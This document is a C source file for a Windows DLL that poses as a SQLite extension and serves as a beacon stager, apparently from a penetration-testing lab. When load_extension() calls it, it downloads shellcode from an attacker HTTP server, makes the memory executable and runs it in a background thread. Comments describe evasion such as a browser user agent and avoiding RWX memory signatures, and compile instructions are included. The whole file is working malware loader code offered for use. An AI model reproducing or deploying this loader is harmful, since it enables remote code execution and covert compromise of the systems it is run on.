/*
 * loader.c  —  SQLite extension DLL (beacon stager)
 *
 * Exports sqlite3_extension_init so SQLite's load_extension() calls it.
 * Downloads raw stageless beacon from the attacker HTTP server,
 * copies it into RW memory, flips to RX, fires in a background thread.
 * Returns SQLITE_OK so the SQL executor doesn't error out.
 *
 * Compile (mingw):
 *   x86_64-w64-mingw32-gcc -shared -o loader.dll loader.c -lwininet
 */

#include <windows.h>
#include <wininet.h>
#include <stdlib.h>
#include <string.h>

#define BEACON_URL "http://10.10.16.56/beacon.bin"
#define BUFFER_SIZE (512 * 1024) /* 512 KB — fits the ~300 KB stageless beacon */

__declspec(dllexport) int sqlite3_extension_init(
    void *db,
    char **pzErrMsg,
    void *pApi)
{
    HINTERNET hInet = NULL;
    HINTERNET hUrl = NULL;
    char *buf = NULL;
    void *exec = NULL;
    DWORD read = 0;
    DWORD total = 0;
    DWORD oldProt = 0;

    buf = (char *)malloc(BUFFER_SIZE);
    if (!buf)
        goto cleanup;

    /* Browser UA — a firewall log sees a page fetch, not an implant */
    hInet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInet)
        goto cleanup;

    /* Fetch the stageless beacon over plain HTTP */
    hUrl = InternetOpenUrlA(hInet, BEACON_URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl)
        goto cleanup;

    /* Loop — handles slow networks and large payloads */
    while (InternetReadFile(hUrl, buf + total, BUFFER_SIZE - total, &read) && read > 0)
        total += read;

    if (!total)
        goto cleanup;

    /* Allocate RW first — avoids RWX page signature */
    exec = VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec)
        goto cleanup;

    memcpy(exec, buf, total);

    /* Flip to RX before executing */
    if (!VirtualProtect(exec, total, PAGE_EXECUTE_READ, &oldProt))
        goto cleanup;

    /* Fire and forget — DLL stays loaded, beacon runs in background.
     * exec is intentionally not freed: the beacon shellcode lives there. */
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    exec = NULL; /* prevent cleanup from freeing the live shellcode region */

cleanup:
    if (hUrl)
        InternetCloseHandle(hUrl);
    if (hInet)
        InternetCloseHandle(hInet);
    if (exec)
        VirtualFree(exec, 0, MEM_RELEASE); /* only if thread never started */
    free(buf);

    return 0; /* SQLITE_OK */
}
